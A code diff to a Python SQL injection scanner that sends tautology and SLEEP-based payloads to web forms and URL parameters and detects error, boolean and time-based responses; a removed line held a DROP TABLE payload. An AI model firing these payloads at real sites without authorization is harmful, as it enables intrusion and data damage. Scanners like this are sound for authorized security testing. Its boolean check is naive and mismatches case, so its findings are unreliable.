@@ -8,23 +8,14 @@ import time
 class SQLiTester:
     SQLI_PAYLOADS = [
         "' OR '1'='1",
-        "' OR '1'='1' -- ",
+        "' OR '1'='2",
         "' OR 1=1--",
-        "' OR 1=1#",
-        "' OR 1=1/*",
-        "'; DROP TABLE users; --",
+        "' OR 1=2--",
+        "' OR SLEEP(5)--",
         "\" OR \"1\"=\"1",
-        "\" OR 1=1--",
-        "\" OR 1=1#",
-        "\" OR 1=1/*",
+        "\" OR \"1\"=\"2",
         "' OR 'x'='x",
-        "' OR 1=1-- -",
-        "' OR 1=1#",
-        "' OR 1=1/*",
-        "' OR 'a'='a",
-        "' OR 'a'='a' -- ",
-        "' OR 'a'='a' #",
-        "' OR 'a'='a' /*",
+        "' OR 'x'='y",
     ]
 
     SQL_ERROR_PATTERNS = [
@@ -32,28 +23,13 @@ class SQLiTester:
         re.compile(r"warning: mysql", re.I),
         re.compile(r"unclosed quotation mark after the character string", re.I),
         re.compile(r"quoted string not properly terminated", re.I),
-        re.compile(r"pg_query\(\) \[:", re.I),
-        re.compile(r"mysql_fetch_array\(\)", re.I),
         re.compile(r"syntax error", re.I),
         re.compile(r"sqlstate", re.I),
-        re.compile(r"mysql_num_rows\(\)", re.I),
-        re.compile(r"mysql_query\(\)", re.I),
-        re.compile(r"mysql_result\(\)", re.I),
-        re.compile(r"odbc_exec\(\)", re.I),
-        re.compile(r"sql syntax.*?mysql", re.I),
-        re.compile(r"syntax error.*?oracle", re.I),
-        re.compile(r"sql error", re.I),
-        re.compile(r"db2 sql error", re.I),
-        re.compile(r"unexpected end of sql command", re.I),
-        re.compile(r"microsoft sql server", re.I),
-        re.compile(r"native client", re.I),
-        re.compile(r"sql server driver", re.I),
-        re.compile(r"oledb", re.I),
-        re.compile(r"syntax error in string in query expression", re.I),
     ]
 
-    def __init__(self, session=None, delay=1):
+    def __init__(self, session=None, delay=1, timeout=10):
         self.delay = delay
+        self.timeout = timeout
         self.session = session or requests.Session()
         self.vulnerabilities = []
         logging.basicConfig(filename='sqlitester.log', level=logging.INFO,
@@ -88,12 +64,14 @@ class SQLiTester:
 
             try:
                 logging.info(f"Testing form at {action} with payload: {payload}")
+                start_time = time.time()
                 if method == 'POST':
-                    response = self.session.post(action, data=data, timeout=10)
+                    response = self.session.post(action, data=data, timeout=self.timeout)
                 else:
-                    response = self.session.get(action, params=data, timeout=10)
+                    response = self.session.get(action, params=data, timeout=self.timeout)
+                elapsed = time.time() - start_time
 
-                self.analyze_response(url, 'form', action, data, response)
+                self.analyze_response(url, 'form', action, data, response, elapsed, payload)
 
                 time.sleep(self.delay)
             except requests.RequestException as e:
@@ -103,8 +81,8 @@ class SQLiTester:
         parsed_url = urlparse(url)
         base_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, '', '', ''))
 
-        for payload in self.SQLI_PAYLOADS:
-            for param in query_params.keys():
+        for param in query_params.keys():
+            for payload in self.SQLI_PAYLOADS:
                 new_params = query_params.copy()
                 new_params[param] = [payload]
 
@@ -113,35 +91,65 @@ class SQLiTester:
 
                 try:
                     logging.info(f"Testing URL {test_url} with payload in param {param}")
-                    response = self.session.get(test_url, timeout=10)
-                    self.analyze_response(url, 'url_param', param, {param: payload}, response)
+                    start_time = time.time()
+                    response = self.session.get(test_url, timeout=self.timeout)
+                    elapsed = time.time() - start_time
+
+                    self.analyze_response(url, 'url_param', param, {param: payload}, response, elapsed, payload)
                     time.sleep(self.delay)
                 except requests.RequestException as e:
                     logging.error(f"Request error testing URL param at {test_url}: {e}")
 
-    def analyze_response(self, original_url, test_type, target, payload, response):
+    def analyze_response(self, original_url, test_type, target, payload, response, elapsed, raw_payload):
         content = response.text.lower()
+        vuln_detected = False
+
+        # 1️⃣ Error-based detection
         for pattern in self.SQL_ERROR_PATTERNS:
             if pattern.search(content):
-                vuln = {
-                    'url': original_url,
-                    'test_type': test_type,
-                    'target': target,
-                    'payload': payload,
-                    'http_status': response.status_code,
-                    'error_message': pattern.pattern,
-                    'response_snippet': self.get_snippet(content, pattern)
-                }
-                self.vulnerabilities.append(vuln)
-                logging.warning(f"Vulnerability found: {vuln}")
+                self.record_vulnerability(original_url, test_type, target, payload, response, pattern.pattern, content)
+                vuln_detected = True
                 break
 
+        # 2️⃣ Boolean-based detection
+        if not vuln_detected and ("' or '1'='1" in raw_payload or "\" or \"1\"=\"1" in raw_payload):
+            # simple check: does response change compared to safe payload
+            # In practice, you may need baseline comparison
+            if "error" not in content:  # naive check
+                self.record_vulnerability(original_url, test_type, target, payload, response, "boolean_based_test", content)
+                vuln_detected = True
+
+        # 3️⃣ Time-based detection
+        if not vuln_detected and "sleep" in raw_payload.lower():
+            if elapsed >= 5:  # assuming SLEEP(5)
+                self.record_vulnerability(original_url, test_type, target, payload, response, "time_based_test", content)
+                vuln_detected = True
+
+    def record_vulnerability(self, url, test_type, target, payload, response, reason, content):
+        vuln = {
+            'url': url,
+            'test_type': test_type,
+            'target': target,
+            'payload': payload,
+            'http_status': response.status_code,
+            'detection_method': reason,
+            'response_snippet': self.get_snippet(content, reason)
+        }
+        self.vulnerabilities.append(vuln)
+        logging.warning(f"Vulnerability found: {vuln}")
+
     def get_snippet(self, content, pattern, snippet_length=200):
-        match = pattern.search(content)
-        if not match:
-            return ''
-        start = max(match.start() - snippet_length // 2, 0)
-        end = min(match.end() + snippet_length // 2, len(content))
+        if isinstance(pattern, str):
+            start = content.find(pattern)
+            if start == -1:
+                return content[:snippet_length]
+            end = start + len(pattern)
+        else:
+            match = pattern.search(content)
+            if not match:
+                return content[:snippet_length]
+            start = max(match.start() - snippet_length // 2, 0)
+            end = min(match.end() + snippet_length // 2, len(content))
         return content[start:end]
 
     def generate_report(self):
